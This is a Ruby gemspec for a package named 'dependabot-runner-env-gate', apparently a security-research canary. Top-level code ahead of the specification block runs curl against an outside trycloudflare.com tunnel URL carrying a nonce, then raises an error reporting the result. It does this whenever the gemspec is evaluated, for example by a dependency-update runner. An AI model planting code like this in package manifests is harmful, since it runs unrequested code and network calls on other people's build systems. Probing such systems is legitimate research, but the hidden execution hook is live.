probe_nonce = "20261012ENVABA"
probe_url = "https://several-philosophy-counted-ann.trycloudflare.com/f005-env-gate/#{probe_nonce}"

request_ok = system(
  "/usr/bin/curl",
  "--silent",
  "--show-error",
  "--output", "/dev/null",
  "--max-time", "20",
  probe_url
)

raise "F005_RUNNER_ENV_GATE_REQUEST_#{probe_nonce}=#{request_ok.inspect}"

Gem::Specification.new do |spec|
  spec.name = "dependabot-runner-env-gate"
  spec.version = "0.0.1"
  spec.summary = "Owned Dependabot Runner environment-gate canary"
  spec.authors = ["Mrunal Chawda"]
  spec.files = ["lib/dependabot_runner_env_gate.rb"]
  spec.require_paths = ["lib"]
end
